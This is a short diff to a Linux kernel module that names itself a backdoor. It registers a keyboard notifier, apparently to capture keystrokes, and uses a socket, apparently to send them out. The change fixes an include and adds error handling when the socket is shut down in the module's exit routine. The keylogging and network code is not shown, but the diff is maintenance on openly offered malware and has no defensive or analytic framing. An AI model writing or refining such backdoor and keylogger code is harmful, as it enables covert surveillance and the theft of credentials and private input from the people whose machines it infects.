@@ -7,7 +7,7 @@
 #include <linux/delay.h>
 
 #include "backdoor.h"
-#include "utils/networking.c"
+#include "utils/networking.h"
 
 static struct notifier_block keyboard_notifier_block = {
     .notifier_call = keyboard_notifier_callback,
@@ -73,9 +73,15 @@ static int __init keyboard_module_init(void) {
 }
 
 static void __exit keyboard_module_exit(void) {
+    int ret;
     // Unregister the keyboard notifier
     unregister_keyboard_notifier(&keyboard_notifier_block);
-    shutdown_socket();
+    ret = shutdown_socket();
+
+    if (ret < 0) {
+	printk(KERN_ERR "Unable to release socket");
+	return;
+    }
     printk(KERN_INFO "Backdoor module exited\n");
 }
 
